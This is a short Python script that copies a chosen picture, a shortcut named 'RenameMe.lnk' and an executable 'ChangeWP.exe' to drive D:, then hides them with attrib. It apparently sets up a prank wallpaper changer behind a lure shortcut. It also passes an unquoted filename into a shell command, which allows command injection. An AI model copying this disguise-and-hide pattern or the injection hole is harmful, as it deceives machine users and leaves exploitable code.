import os
import tkinter as tk
import tkinter.messagebox as messagebox
import tkinter.filedialog as filedialog
import shutil
import subprocess

tk.Tk().withdraw()
messagebox.showinfo('<Instruction>', 'On the next page, please select the picture(.jpg, .png or others).')

tk.Tk().withdraw()
pic_path = filedialog.askopenfilename() #select pic

shutil.copy(f'{pic_path}', 'D:') #make copy of the pic on D:
basename = os.path.basename(pic_path) #put file name of pic into {basename}

f = open("D:\\pic_name.txt", 'w')
f.write(f"{basename}") #write down the file name of the pic for Do_not_misuse.exe to notice the file name that it have to pick up
f.close

shutil.copy('d:\\resources\\RenameMe.lnk', 'D:') #make copy of RenameMe.lnk on D:
shutil.copy('d:\\resources\\ChangeWP.exe', 'D:') #make copy of ChangeWP.exe on D:

subprocess.run('attrib +r +h d:\\ChangeWP.exe' #hide ChangeWP.exe
                +f'&& attrib +r +h d:\\{basename}' #hide the pic
                +'&& attrib +r +h d:\\pic_name.txt', shell=True) #hide note of file name of pic